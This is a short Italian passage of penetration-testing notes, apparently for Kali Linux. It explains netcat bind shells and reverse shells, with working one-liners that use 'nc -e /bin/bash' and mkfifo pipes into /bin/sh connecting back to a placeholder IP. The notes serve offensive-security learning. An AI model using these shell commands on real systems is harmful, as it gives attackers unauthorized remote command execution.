In alcune versioni di netcat (inclusa la **`nc.exe`**versione Windows inclusa con Kali in **`/usr/share/windows-resources/binaries`**, e la versione usata in Kali stessa: **`netcat-traditional`**) c'è un'opzione **`-e`**che consente di eseguire un processo sulla connessione. Ad esempio, come listener: 

- **nc -lvnp <PORT> -e /bin/bash**
    - Otterremo una **bind bind** sulla destinazione.
- **nc <LOCAL-IP> <PORT> -e /bin/bash**
    - Otterremo una **reverse shell**

Su Windows questa tecnica funziona. Su Linux ,  useremmo invece questo codice per creare un listener per una bind shell:

- **mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f**

> Il comando crea prima una **pipe** denominata in **/tmp/f**. Quindi **avvia** un **listener netcat** e collega l'input del listener all'output della pipe denominata. L'output del listener netcat (vale a dire **i comandi che inviamo**) viene quindi convogliato direttamente in sh, inviando il flusso di output stderr in stdout e inviando stdout stesso nell'input della pipe denominata, completando così il cerchio.
>

![image](https://github.com/user-attachments/assets/d6aa68a2-5699-4d0b-879d-46e2330b3784)

Un comando molto simile può essere utilizzato per inviare una shell inversa netcat:

- mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

Questo comando è praticamente identico al precedente, solo che utilizza la sintassi netcat connect anziché la sintassi netcat listen.

![image](https://github.com/user-attachments/assets/af84cd99-5a32-45f8-aa07-039e22aa5616)

# one-liner PSH reverse shell

Non caricabile 

![image](https://github.com/user-attachments/assets/837c1dea-b6f5-467f-97c8-82e5db34e6ef)



